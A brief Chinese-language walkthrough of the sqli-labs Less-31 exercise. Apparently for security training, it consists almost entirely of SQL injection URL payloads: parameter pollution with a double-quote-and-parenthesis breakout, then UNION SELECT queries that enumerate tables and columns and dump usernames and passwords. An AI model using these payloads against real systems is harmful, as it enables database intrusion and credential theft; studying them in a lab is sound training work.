# Less-31

和三十关差不多，多了一个括号，用注入指令

~~~ cmd
?id=1&id=-2")--+
~~~



~~~ cmd
?id=1&id=-2")%20union%20select%201,2,3--+
~~~

![](.\img\Less-31-01.png)



~~~ cmd
?id=1&id=-2")%20union%20select%201,database(),version()--+
~~~

![](.\img\Less-31-02.png)



~~~ cmd
?id=1&id=-2%22)%20union%20select%201,database(),group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27security%27--+
~~~

![](.\img\Less-31-03.png)



~~~ cmd
?id=1&id=-2%22)%20union%20select%201,database(),group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27--+
~~~

![](.\img\Less-31-04.png)



~~~ cmd
?id=1&id=-2%22)%20union%20select%201,database(),group_concat(username,password)%20from%20users--+
~~~

![](.\img\Less-31-05.png)